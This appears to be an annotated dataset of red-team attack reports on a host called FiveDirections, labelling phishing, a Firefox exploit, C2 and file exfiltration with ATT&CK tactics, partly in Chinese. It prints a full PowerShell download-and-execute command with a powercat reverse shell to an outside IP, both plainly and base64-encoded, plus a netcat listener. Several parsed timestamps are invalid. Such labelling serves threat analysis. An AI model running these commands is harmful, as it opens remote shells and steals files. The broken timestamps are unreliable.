AdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBh AG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAAL QBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAG UAeABlAA==
   - Time: `-` / `-`
   - Observables: file_path=C:\Users\user; file_path=C:\programdata\; file_path=C:\\programdata\\update.ps1;; file_path=/208.75.117.5/update.ps1; domain=Net.WebClient; domain=cmd.exe; domain=Text.Encoding; domain=Unicode.GetBytes; process_name=powershell; command=Common Threat attacked FiveDirections using e-mail phishing and Excel spreadsheet macro with powershell. The attacker used information gathered from the Bob user's e-mail account to send phishing e-mails to other employees. The e-mail included a spreadsheet attachment with an encoded powershell command. The powershell command downloaded a powershell script and executed it, resulting in a new connection out for a remote command shell. The command was not executed as expected. The user saw the command in the macro and ran it manually from a command shell. The attacker now had a shell to the machine. The attacker ran many commands to survey the target, including reading the hosts file and several personal files. PS C:\Users\user> $command = {(New-Object Net.WebClient).downloadfile('http://208.75.117.5/update.ps1', 'C:\programdata\ update.ps1'); . C:\\programdata\\update.ps1; powercat -c 208.75.117.6 -p 80 - e cmd.exe} PS C:\Users\user> $bytes = [Text.Encoding]::Unicode.GetBytes($command) PS C:\Users\user> $encCmd = [Convert]::ToBase64String($bytes) PS C:\Users\user> $encCmd KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvA HcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANw AuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGE AdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBh AG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAAL QBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAG UAeABlAA==; host=FIVEDIRECTIONS; email_artifact=update.ps1
1. `4_4_e002` | `narrative_comment` | `4.4.1 Comments` | lines `1442-1450`
   - Raw: The attack failed to work as originally intended. Even with macros enabled, for some reason the powershell command did not execute automatically when the spreadsheet was opened. As this was tested successfully on Windows 10 previously, there must have been some conflict or overlooked setting with the FiveDirections host. We noticed during the test that the operating system's path environment variable was broken so that no commands could be run from command line. This included utilities like ping, ftp, etc. We fixed the broken path, but still, the powershell command did not execute from Excel. Finally, we copied the encoded string into a command shell and ran it manually. We instantly got a shell and then had access. This wasn't an issue on the TA5.2 Windows host, which successfully launch the powershell script from the Excel macro on the first try.
   - Time: `-` / `-`
   - Observables: process_name=powershell; command=The attack failed to work as originally intended. Even with macros enabled, for some reason the powershell command did not execute automatically when the spreadsheet was opened. As this was tested successfully on Windows 10 previously, there must have been some conflict or overlooked setting with the FiveDirections host. We noticed during the test that the operating system's path environment variable was broken so that no commands could be run from command line. This included utilities like ping, ftp, etc. We fixed the broken path, but still, the powershell command did not execute from Excel. Finally, we copied the encoded string into a command shell and ran it manually. We instantly got a shell and then had access. This wasn't an issue on the TA5.2 Windows host, which successfully launch the powershell script from the Excel macro on the first try.; host=FIVEDIRECTIONS
1. `4_4_e003` | `event_log` | `4.4.2 Event Log` | lines `1454-1454`
   - Raw: Prepared BoviaBenefitsOE.xlsm attachment with IP and port connect back
   - Time: `-` / `-`
   - Observables: email_artifact=BoviaBenefitsOE.xlsm
1. `4_4_e004` | `event_log` | `4.4.2 Event Log` | lines `1455-1455`
   - Raw: python -m SimpleHTTPServer 2525 (208.75.117.5 80)
   - Time: `-` / `-`
   - Observables: command=python -m SimpleHTTPServer 2525 (208.75.117.5 80)
1. `4_4_e005` | `event_log` | `4.4.2 Event Log` | lines `1456-1456`
   - Raw: nc -l 2526
   - Time: `-` / `-`
   - Observables: command=nc -l 2526
1. `4_4_e006` | `event_log` | `4.4.2 Event Log` | lines `1457-1457`
   - Raw: 13:19 Send e-mail from Bob to Charles (68.
   - Time: `13:19` / `2018-04-09T13:19:00`
   - Observables: -
1. `4_4_e007` | `event_log` | `4.4.2 Event Log` | lines `1458-1458`
   - Raw: 13:38 Failed to load e-mail client on FAROS
   - Time: `13:38` / `2018-04-09T13:38:00`
   - Observables: -
1. `4_4_e008` | `event_log` | `4.4.2 Event Log` | lines `1459-1459`
   - Raw: 13:38 TA52-1 windows is inaccessible, is it down?
   - Time: `13:38` / `2018-04-09T13:38:00`
   - Observables: -
1. `4_4_e009` | `event_log` | `4.4.2 Event Log` | lines `1460-1460`
   - Raw: 13:49 5D is missing ping, ftp
   - Time: `13:49` / `2018-04-09T13:49:00`
   - Observables: -
1. `4_4_e010` | `event_log` | `4.4.2 Event Log` | lines `1461-1461`
   - Raw: 14:49 Opened spreadsheet again, connect out did not occur
   - Time: `14:49` / `2018-04-09T14:49:00`
   - Observables: -
1. `4_4_e011` | `event_log` | `4.4.2 Event Log` | lines `1462-1470`
   - Raw: 15:07 Manually ran powershell command and got connection back, ran this: powershell -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvA HcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANw AuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGE AdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBh AG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAAL QBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAG UAeABlAA==
   - Time: `15:07` / `2018-04-09T15:07:00`
   - Observables: process_name=powershell; command=15:07 Manually ran powershell command and got connection back, ran this: powershell -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvA HcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANw AuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGE AdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBh AG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAAL QBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAG UAeABlAA==
1. `4_4_e012` | `event_log` | `4.4.2 Event Log` | lines `1472-1472`
   - Raw: 15:42 Exit
   - Time: `15:42` / `2018-04-09T15:42:00`
   - Observables: -
1. `4_4_e013` | `interaction_file` | `4.4.3.1 Files` | lines `1478-1478`
   - Raw: BoviaBenefitsOE.xlsm
   - Time: `-` / `-`
   - Observables: email_artifact=BoviaBenefitsOE.xlsm
1. `4_4_e014` | `interaction_file` | `4.4.3.1 Files` | lines `1479-1479`
   - Raw: update.ps1
   - Time: `-` / `-`
   - Observables: command=update.ps1; email_artifact=update.ps1
1. `4_4_e015` | `interaction_file` | `4.4.3.1 Files` | lines `1480-1480`
   - Raw: C:\Users\admin>type C:\windows\system32\drivers\etc\hosts
   - Time: `-` / `-`
   - Observables: file_path=C:\Users\admin; file_path=C:\windows\system32\drivers\etc\hosts
1. `4_4_e016` | `interaction_file` | `4.4.3.1 Files` | lines `1481-1481`
   - Raw: C:\Users\admin\Documents>mkdir mydocs
   - Time: `-` / `-`
   - Observables: file_path=C:\Users\admin\Documents
1. `4_4_e017` | `interaction_file` | `4.4.3.1 Files` | lines `1482-1482`
   - Raw: C:\Users\admin\Documents>rmdir mydocs
   - Time: `-` / `-`
   - Observables: file_path=C:\Users\admin\Documents
1. `4_4_e018` | `interaction_file` | `4.4.3.1 Files` | lines `1483-1483`
   - Raw: C:\Users\admin\Documents>type Document.rtf
   - Time: `-` / `-`
   - Observables: file_path=C:\Users\admin\Documents
1. `4_4_e019` | `interaction_file` | `4.4.3.1 Files` | lines `1484-1484`
   - Raw: C:\Users\admin\Documents>type MissleAlert.rtf
   - Time: `-` / `-`
   - Observables: file_path=C:\Users\admin\Documents
1. `4_4_e020` | `interaction_file` | `4.4.3.1 Files` | lines `1485-1485`
   - Raw: C:\Users\admin\Documents>type trains.rtf
   - Time: `-` / `-`
   - Observables: file_path=C:\Users\admin\Documents
1. `4_4_e021` | `interaction_file` | `4.4.3.1 Files` | lines `1486-1486`
   - Raw: C:\Users\admin\Desktop>del BoviaBenefitsOE.xlsm
   - Time: `-` / `-`
   - Observables: file_path=C:\Users\admin\Desktop; email_artifact=BoviaBenefitsOE.xlsm
1. `4_4_e022` | `interaction_process` | `4.4.3.2 Processes` | lines `1490-1490`
   - Raw: C:\Users\admin\Desktop>taskkill /PID 8744 /F
   - Time: `-` / `-`
   - Observables: file_path=C:\Users\admin\Desktop; pid=8744; command=C:\Users\admin\Desktop>taskkill /PID 8744 /F
1. `4_4_e023` | `interaction_connection` | `4.4.3.3 Connections` | lines `1494-1494`
   - Raw: Connect out to 208.75.117.5 to download update.ps1
   - Time: `-` / `-`
   - Observables: command=Connect out to 208.75.117.5 to download update.ps1; email_artifact=update.ps1

### FIVEDIRECTIONS_20180411_1000_1040_02 / Section 3.4

- 标题：`20180411 1000 FiveDirections – Firefox Backdoor w/ Drakon In-Memory`
- 状态：`confirmed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-11T10:00:00` -> `2018-04-11T10:40:00`
- Markdown 行号：`422-493`
- 报告页：`10, 11`
- 攻击概述：FiveDirections 通过 Firefox 恶意网站 exploit 获得 drakon 会话，执行 netrecon，对主机与网络做侦察，并读取/取回多个本地文档，报告正文明确说明已外传多个文件。
- 备注：该节同时包含显式 file read/getfile 与正文里的 exfil 描述，因此 COLLECTION 和 EXFILTRATION 都保留。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | confirmed | 初始进入 | 恶意网站 exploit 成功后建立 drakon 会话。 | 3_4_e001, 3_4_e005, 3_4_e009, 3_4_e011, 3_4_e032 |
| EXECUTION | confirmed | 执行 | drakon/netrecon 在目标主机上运行并继续执行后续命令。 | 3_4_e001, 3_4_e005, 3_4_e009, 3_4_e011, 3_4_e032, 3_4_e012, 3_4_e013, 3_4_e014 |
| COMMAND_AND_CONTROL | confirmed | 命令控制 | drakon/operator console 与 Firefox 到 shellcode/loaderDrakon 的外联共同支撑 C2。 | 3_4_e001, 3_4_e033, 3_4_e034 |
| DISCOVERY | confirmed | 侦察发现 | hostname、hosts 读取与 netrecon/nrudp 都是侦察行为。 | 3_4_e001, 3_4_e012, 3_4_e013, 3_4_e014, 3_4_e021, 3_4_e022, 3_4_e027, 3_4_e030, 3_4_e031 |
| COLLECTION | confirmed | 数据收集 | 本地敏感文档被 cat/getfile 读取与抓取。 | 3_4_e021, 3_4_e022, 3_4_e027, 3_4_e030, 3_4_e031 |
| EXFILTRATION | confirmed | 数据外传 | 正文直接声明 exfil 多个文件。 | 3_4_e001, 3_4_e004, 3_4_e012 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1189 | confirmed | 通过浏览恶意站点触发 Firefox exploit。 | 3_4_e001, 3_4_e005, 3_4_e009, 3_4_e011, 3_4_e032 |
| T1071.001 | confirmed | drakon 会话与相关对外连接走 web 风格地址。 | 3_4_e001, 3_4_e033, 3_4_e034 |
| T1046 | confirmed | netrecon/nrudp 对网络服务与接口做侦察。 | 3_4_e001, 3_4_e012, 3_4_e013, 3_4_e014 |
| T1005 | confirmed | cat/getfile 明确访问本地文档与配置文件。 | 3_4_e021, 3_4_e022, 3_4_e027, 3_4_e030, 3_4_e031 |
| T1041 | confirmed | 正文直接写明文件被 exfil 到攻击方。 | 3_4_e001, 3_4_e004, 3_4_e012 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| driveby_exploit | exploit_delivery | confirmed | 正文与 Event Log 都明确写到通过 www.cnpc.com.cn exploit Firefox 成功建立连接。 | 3_4_e001, 3_4_e005, 3_4_e009, 3_4_e011, 3_4_e032 |
| c2_callback | c2_callback | confirmed | 正文写到 drakon 在 Firefox 内存中并连接 operator console，连接交互也有 Firefox 到 loaderDrakon 的外联。 | 3_4_e001, 3_4_e033, 3_4_e034 |
| network_scan | scan | confirmed | Event Log 中的 netrecon exfil / nrudp 与正文里的 recon interfaces 明确表明侦察行为。 | 3_4_e001, 3_4_e012, 3_4_e013, 3_4_e014 |
| file_collect | file_read | confirmed | Interactions 里有 cat/getfile 多个本地文档和 hosts 文件。 | 3_4_e021, 3_4_e022, 3_4_e027, 3_4_e030, 3_4_e031 |
| data_exfil | data_exfil | confirmed | 正文直接写明 exfil'ed multiple files from the target。 | 3_4_e001, 3_4_e004, 3_4_e012 |

#### 显式观测

- `domain` / `www.cnpc.com.cn`  Evidence: `3_4_e001, 3_4_e005, 3_4_e009, 3_4_e032`  Raw: www.cnpc.com.cn
- `process_name` / `firefox`  Evidence: `3_4_e001, 3_4_e003, 3_4_e005, 3_4_e006, 3_4_e007, 3_4_e008, 3_4_e009, 3_4_e010, 3_4_e011, 3_4_e015, 3_4_e033, 3_4_e034`  Raw: firefox
- `process_name` / `drakon`  Evidence: `3_4_e001, 3_4_e017`  Raw: drakon
- `process_name` / `netrecon`  Evidence: `3_4_e001, 3_4_e004, 3_4_e012, 3_4_e019, 3_4_e020`  Raw: netrecon
- `host` / `FIVEDIRECTIONS`  Evidence: `3_4_e001, 3_4_e003, 3_4_e004`  Raw: FiveDirections
- `command` / `Similar to the Linux targets, Firefox 54.0.1 crashed on Windows multiple times before the exploit worked. Further testing is required to root cause this issue and determine if it is a side effect of activity, TA1 performer conflict, or the backdoor port itself to this version of Firefox. We eventually gained access to FiveDirections but had limited capabilites on Windows versus the other operating systems. We did not have the elevate driver or process injection ready for engagement 3 and therefore could not`  Evidence: `3_4_e003`  Raw: elevate
- `ip_port` / `193.189.212.26:80`  Evidence: `3_4_e012, 3_4_e019`  Raw: 193.189.212.26:80
- `ip_port` / `179.252.65.246:80`  Evidence: `3_4_e016, 3_4_e032`  Raw: 179.252.65.246:80
- `ip_port` / `128.55.12.167:8020`  Evidence: `3_4_e016`  Raw: 128.55.12.167:8020
- `ip_port` / `16.54.116.146:80`  Evidence: `3_4_e017, 3_4_e034`  Raw: 16.54.116.146:80
- `ip_port` / `128.55.12.167:8022`  Evidence: `3_4_e017`  Raw: 128.55.12.167:8022
- `process_name` / `loaderdrakon`  Evidence: `3_4_e017`  Raw: loaderdrakon
- `ip_port` / `156.78.147.114:80`  Evidence: `3_4_e018, 3_4_e033`  Raw: 156.78.147.114:80
- `ip_port` / `128.55.12.167:8025`  Evidence: `3_4_e018`  Raw: 128.55.12.167:8025
- `ip_port` / `128.55.12.167:8026`  Evidence: `3_4_e019`  Raw: 128.55.12.167:8026
- `ip_port` / `27.56.56.211:80`  Evidence: `3_4_e020`  Raw: 27.56.56.211:80
- `ip_port` / `128.55.12.167:8027`  Evidence: `3_4_e020`  Raw: 128.55.12.167:8027
- `command` / `W1>cat trains.rtf`  Evidence: `3_4_e021`  Raw: cat 
- `command` / `W1>cat malicious.rtf`  Evidence: `3_4_e022`  Raw: cat 
- `command` / `W1>cat locomotives.rtf`  Evidence: `3_4_e023, 3_4_e024`  Raw: cat 
- `command` / `W1>cat Document.rtf`  Evidence: `3_4_e025`  Raw: cat 
- `command` / `W1>cat MissleAlert.rtf`  Evidence: `3_4_e026`  Raw: cat 
- `command` / `W1>getfile Missledefence.doc`  Evidence: `3_4_e027`  Raw: getfile
- `command` / `W1>getfile trains.docx`  Evidence: `3_4_e028`  Raw: getfile
- `command` / `W1>getfile test.docx`  Evidence: `3_4_e029`  Raw: getfile
- `command` / `W1>getfile Covert.xlsx`  Evidence: `3_4_e030`  Raw: getfile
- `command` / `W1>cat hosts`  Evidence: `3_4_e031`  Raw: cat 

#### 原始子节摘录

- `3.4.lead` Section Lead (lines 424-429)

  > Began attack with FiveDirections Windows 10 by exploiting Firefox 54.0.1 by browsing to
  > www.cnpc.com.cn. Via the exploit, drakon was loaded into memory in the Firefox process, which
  > connected out to the operator console for C2. The attacker loaded the netrecon module to recon the
  > network interfaces of the target host. The attacker exfil'ed multiple files from the target host's
  > documents directory. The attacker intended to leave the connection open for later but lost access when
  > the netrecon UDP exfil failed.

- `3.4.1` Comments (lines 431-444)

  > The final targets were the Windows hosts. The goal of the attack was to exfil sensitive information,
  > including documents, contacts, passwords, etc.
  > Similar to the Linux targets, Firefox 54.0.1 crashed on Windows multiple times before the exploit
  > worked. Further testing is required to root cause this issue and determine if it is a side effect of activity,
  > TA1 performer conflict, or the backdoor port itself to this version of Firefox. We eventually gained
  > access to FiveDirections but had limited capabilites on Windows versus the other operating systems.
  > We did not have the elevate driver or process injection ready for engagement 3 and therefore could not
  > use them on FiveDirections. We deployed the netrecon module, exfil'ed its output, and exfil'ed multiple
  > files from the target.

- `3.4.2` Event Log (lines 445-458)

  > - 1000 Browsed Firefox to www.cnpc.com.cn using shellcode_server 1
  > - 1000 Firefox crash
  > - 1001 Firefox crash
  > - 1003 Firefox crash
  > - 1007 Browsed Firefox to www.cnpc.com.cn using shellcode_server 2
  > - 1007 Firefox crash
  > - 1009 Firefox connect
  > - 1015 netrecon exfil 193.189.212.26:80
  > - 1039 hostname
  > - 1040 nrudp 27.56.56.211 80
  > - 1040 no response, firefox crash

- `3.4.3` Addresses (lines 459-466)

  > - [eth0:900] 179.252.65.246:80 -> 128.55.12.167:8020 webserver
  > - [eth0:902] 16.54.116.146:80 -> 128.55.12.167:8022 loaderDrakon
  > - [eth0:905] 156.78.147.114:80 -> 128.55.12.167:8025 shellcode_server
  > - [eth0:906] 193.189.212.26:80 -> 128.55.12.167:8026 netrecon tcp
  > - [eth0:907] 27.56.56.211:80 -> 128.55.12.167:8027 netrecon udp

- `3.4.4` Interactions (lines 467-468)
- `3.4.4.1` Files (lines 469-482)

  > - W1>cat trains.rtf
  > - W1>cat malicious.rtf
  > - W1>cat locomotives.rtf
  > - W1>cat locomotives.rtf
  > - W1>cat Document.rtf
  > - W1>cat MissleAlert.rtf
  > - W1>getfile Missledefence.doc
  > - W1>getfile trains.docx
  > - W1>getfile test.docx
  > - W1>getfile Covert.xlsx
  > - W1>cat hosts

- `3.4.4.2` Connections (lines 483-489)

  > - exploit www.cnpc.com.cn 179.252.65.246:80
  > - firefox: connection to 156.78.147.114:80
  > - firefox: connection to 16.54.116.146:80
  > - W1>nrtcp 193.189.212.26 80

- `3.4.5` Graph (lines 490-493)
#### 证据条目

1. `3_4_e001` | `narrative_comment` | `3.4.lead Section Lead` | lines `424-429`
   - Raw: Began attack with FiveDirections Windows 10 by exploiting Firefox 54.0.1 by browsing to www.cnpc.com.cn. Via the exploit, drakon was loaded into memory in the Firefox process, which connected out to the operator console for C2. The attacker loaded the netrecon module to recon the network interfaces of the target host. The attacker exfil'ed multiple files from the target host's documents directory. The attacker intended to leave the connection open for later but lost access when the netrecon UDP exfil failed.
   - Time: `-` / `-`
   - Observables: domain=www.cnpc.com.cn; process_name=firefox; process_name=drakon; process_name=netrecon; host=FIVEDIRECTIONS
1. `3_4_e002` | `narrative_comment` | `3.4.1 Comments` | lines `433-434`
   - Raw: The final targets were the Windows hosts. The goal of the attack was to exfil sensitive information, including documents, contacts, passwords, etc.
   - Time: `-` / `-`
   - Observables: -
1. `3_4_e003` | `narrative_comment` | `3.4.1 Comments` | lines `436-440`
   - Raw: Similar to the Linux targets, Firefox 54.0.1 crashed on Windows multiple times before the exploit worked. Further testing is required to root cause this issue and determine if it is a side effect of activity, TA1 performer conflict, or the backdoor port itself to this version of Firefox. We eventually gained access to FiveDirections but had limited capabilites on Windows versus the other operating systems. We did not have the elevate driver or process injection ready for engagement 3 and therefore could not
   - Time: `-` / `-`
   - Observables: process_name=firefox; command=Similar to the Linux targets, Firefox 54.0.1 crashed on Windows multiple times before the exploit worked. Further testing is required to root cause this issue and determine if it is a side effect of activity, TA1 performer conflict, or the backdoor port itself to this version of Firefox. We eventually gained access to FiveDirections but had limited capabilites on Windows versus the other operating systems. We did not have the elevate driver or process injection ready for engagement 3 and therefore could not; host=FIVEDIRECTIONS
1. `3_4_e004` | `narrative_comment` | `3.4.1 Comments` | lines `442-443`
   - Raw: use them on FiveDirections. We deployed the netrecon module, exfil'ed its output, and exfil'ed multiple files from the target.
   - Time: `-` / `-`
   - Observables: process_name=netrecon; host=FIVEDIRECTIONS
1. `3_4_e005` | `event_log` | `3.4.2 Event Log` | lines `447-447`
   - Raw: 1000 Browsed Firefox to www.cnpc.com.cn using shellcode_server 1
   - Time: `1000` / `2018-04-11T10:00:00`
   - Observables: domain=www.cnpc.com.cn; process_name=firefox
1. `3_4_e006` | `event_log` | `3.4.2 Event Log` | lines `448-448`
   - Raw: 1000 Firefox crash
   - Time: `1000` / `2018-04-11T10:00:00`
   - Observables: process_name=firefox
1. `3_4_e007` | `event_log` | `3.4.2 Event Log` | lines `449-449`
   - Raw: 1001 Firefox crash
   - Time: `1001` / `2018-04-11T10:01:00`
   - Observables: process_name=firefox
1. `3_4_e008` | `event_log` | `3.4.2 Event Log` | lines `450-450`
   - Raw: 1003 Firefox crash
   - Time: `1003` / `2018-04-11T10:03:00`
   - Observables: process_name=firefox
1. `3_4_e009` | `event_log` | `3.4.2 Event Log` | lines `451-451`
   - Raw: 1007 Browsed Firefox to www.cnpc.com.cn using shellcode_server 2
   - Time: `1007` / `2018-04-11T10:07:00`
   - Observables: domain=www.cnpc.com.cn; process_name=firefox
1. `3_4_e010` | `event_log` | `3.4.2 Event Log` | lines `452-452`
   - Raw: 1007 Firefox crash
   - Time: `1007` / `2018-04-11T10:07:00`
   - Observables: process_name=firefox
1. `3_4_e011` | `event_log` | `3.4.2 Event Log` | lines `453-453`
   - Raw: 1009 Firefox connect
   - Time: `1009` / `2018-04-11T10:09:00`
   - Observables: process_name=firefox
1. `3_4_e012` | `event_log` | `3.4.2 Event Log` | lines `454-454`
   - Raw: 1015 netrecon exfil 193.189.212.26:80
   - Time: `26:80` / `2018-04-11T26:80:00`
   - Observables: ip_port=193.189.212.26:80; process_name=netrecon
1. `3_4_e013` | `event_log` | `3.4.2 Event Log` | lines `455-455`
   - Raw: 1039 hostname
   - Time: `1039` / `2018-04-11T10:39:00`
   - Observables: -
1. `3_4_e014` | `event_log` | `3.4.2 Event Log` | lines `456-456`
   - Raw: 1040 nrudp 27.56.56.211 80
   - Time: `27.56` / `2018-04-11T27:56:00`
   - Observables: -
1. `3_4_e015` | `event_log` | `3.4.2 Event Log` | lines `457-457`
   - Raw: 1040 no response, firefox crash
   - Time: `1040` / `2018-04-11T10:40:00`
   - Observables: process_name=firefox
1. `3_4_e016` | `address` | `3.4.3 Addresses` | lines `461-461`
   - Raw: [eth0:900] 179.252.65.246:80 -> 128.55.12.167:8020 webserver
   - Time: `55.12` / `2018-04-11T55:12:00`
   - Observables: ip_port=179.252.65.246:80; ip_port=128.55.12.167:8020
1. `3_4_e017` | `address` | `3.4.3 Addresses` | lines `462-462`
   - Raw: [eth0:902] 16.54.116.146:80 -> 128.55.12.167:8022 loaderDrakon
   - Time: `16.54` / `2018-04-11T16:54:00`
   - Observables: ip_port=16.54.116.146:80; ip_port=128.55.12.167:8022; process_name=drakon; process_name=loaderdrakon
1. `3_4_e018` | `address` | `3.4.3 Addresses` | lines `463-463`
   - Raw: [eth0:905] 156.78.147.114:80 -> 128.55.12.167:8025 shellcode_server
   - Time: `55.12` / `2018-04-11T55:12:00`
   - Observables: ip_port=156.78.147.114:80; ip_port=128.55.12.167:8025
1. `3_4_e019` | `address` | `3.4.3 Addresses` | lines `464-464`
   - Raw: [eth0:906] 193.189.212.26:80 -> 128.55.12.167:8026 netrecon tcp
   - Time: `26:80` / `2018-04-11T26:80:00`
   - Observables: ip_port=193.189.212.26:80; ip_port=128.55.12.167:8026; process_name=netrecon
1. `3_4_e020` | `address` | `3.4.3 Addresses` | lines `465-465`
   - Raw: [eth0:907] 27.56.56.211:80 -> 128.55.12.167:8027 netrecon udp
   - Time: `27.56` / `2018-04-11T27:56:00`
   - Observables: ip_port=27.56.56.211:80; ip_port=128.55.12.167:8027; process_name=netrecon
1. `3_4_e021` | `interaction_file` | `3.4.4.1 Files` | lines `471-471`
   - Raw: W1>cat trains.rtf
   - Time: `-` / `-`
   - Observables: command=W1>cat trains.rtf
1. `3_4_e022` | `interaction_file` | `3.4.4.1 Files` | lines `472-472`
   - Raw: W1>cat malicious.rtf
   - Time: `-` / `-`
   - Observables: command=W1>cat malicious.rtf
1. `3_4_e023` | `interaction_file` | `3.4.4.1 Files` | lines `473-473`
   - Raw: W1>cat locomotives.rtf
   - Time: `-` / `-`
   - Observables: command=W1>cat locomotives.rtf
1. `3_4_e024` | `interaction_file` | `3.4.4.1 Files` | lines `474-474`
   - Raw: W1>cat locomotives.rtf
   - Time: `-` / `-`
   - Observables: command=W1>cat locomotives.rtf
1. `3_4_e025` | `interaction_file` | `3.4.4.1 Files` | lines `475-475`
   - Raw: W1>cat Document.rtf
   - Time: `-` / `-`
   - Observables: command=W1>cat Document.rtf
1. `3_4_e026` | `interaction_file` | `3.4.4.1 Files` | lines `476-476`
   - Raw: W1>cat MissleAlert.rtf
   - Time: `-` / `-`
   - Observables: command=W1>cat MissleAlert.rtf
1. `3_4_e027` | `interaction_file` | `3.4.4.1 Files` | lines `477-477`
   - Raw: W1>getfile Missledefence.doc
   - Time: `-` / `-`
   - Observables: command=W1>getfile Missledefence.doc
1. `3_4_e028` | `interaction_file` | `3.4.4.1 Files` | lines `478-478`
   - Raw: W1>getfile trains.docx
   - Time: `-` / `-`
   - Observables: command=W1>getfile trains.docx
1. `3_4_e029` | `interaction_file` | `3.4.4.1 Files` | lines `479-479`
   - Raw: W1>getfile test.docx
   - Time: `-` / `-`
   - Observables: command=W1>getfile test.docx
1. `3_4_e030` | `interaction_file` | `3.4.4.1 Files` | lines `480-480`
   - Raw: W1>getfile Covert.xlsx
   - Time: `-` / `-`
   - Observables: command=W1>getfile Covert.xlsx
1. `3_4_e031` | `interaction_file` | `3.4.4.1 Files` | lines `481-481`
   - Raw: W1>cat hosts
   - Time: `-` / `-`
   - Observables: command=W1>cat hosts
1. `3_4_e032` | `interaction_connection` | `3.4.4.2 Connections` | lines `485-485`
   - Raw: exploit www.cnpc.com.cn 179.252.65.246:80
   - Time: `-` / `-`
   - Observables: ip_port=179.252.65.246:80; domain=www.cnpc.com.cn
1. `3_4_e033` | `interaction_connection` | `3.4.4.2 Connections` | lines `486-486`
   - Raw: firefox: connection to 156.78.147.114:80
   - Time: `-` / `-`
   - Observables: ip_port=156.78.147.114:80; process_name=firefox
1. `3_4_e034` | `interaction_connection` | `3.4.4.2 Connections` | lines `487-487`
   - Raw: firefox: connection to 16.54.116.146:80
   - Time: `16.54` / `2018-04-11T16:54:00`
   - Observables: ip_port=16.54.116.146:80; process_name=firefox
1. `3_4_e035` | `interaction_connection` | `3.4.4.2 Connections` | lines `488-488`
   - Raw: W1>nrtcp 193.189.212.26 80
   - Time: `-` / `-`
   - Observables: -

### FIVEDIRECTIONS_20180412_1113_1114_03 / Section 3.10

- 标题：`20180412 1100 FiveDirections – Browser Extension w/ Drakon Dropper`
- 状态：`attempted_failed`
- 时间精度：`minute_window`
- 时间窗：`2018-04-12T11:13:00` -> `2018-04-12T11:14:00`
- Markdown 行号：`806-851`
- 报告页：`19`
- 攻击概述：FiveDirections 上的恶意浏览器扩展攻击失败：loaderDrakon 与 drakon dropper 都没有成功运行，但可执行文件被写到了磁盘上。
- 备注：该节只保留 attempted 结论；报告明确说 drakon 没有成功运行、connect out 或 self delete。

#### 战术判定

| Tactic | Judgment | 含义 | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| INITIAL_ACCESS | attempted | 初始进入 | 攻击者尝试用恶意浏览器扩展重新进入主机，但未形成有效控制。 | 3_10_e002, 3_10_e003, 3_10_e004 |
| EXECUTION | attempted | 执行 | 落地文件与 dropper 尝试执行，但因崩溃而失败。 | 3_10_e002, 3_10_e003, 3_10_e004, 3_10_e009, 3_10_e005 |

#### Technique 判定

| Technique | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- |
| T1203 | attempted | 报告明确写到通过恶意浏览器扩展触发 exploit/dropper，但最终失败。 | 3_10_e002, 3_10_e003, 3_10_e004 |

#### Behavior Chain

| Behavior ID | Action | Judgment | Why | Evidence IDs |
| --- | --- | --- | --- | --- |
| browser_extension_attempt | exploit_delivery | attempted | 浏览器扩展攻击被实际触发，但没有得到有效 shell。 | 3_10_e002, 3_10_e003, 3_10_e004 |
| payload_write | payload_write | attempted | hJauWl01 文件被下载到磁盘，但后续执行失败。 | 3_10_e009 |
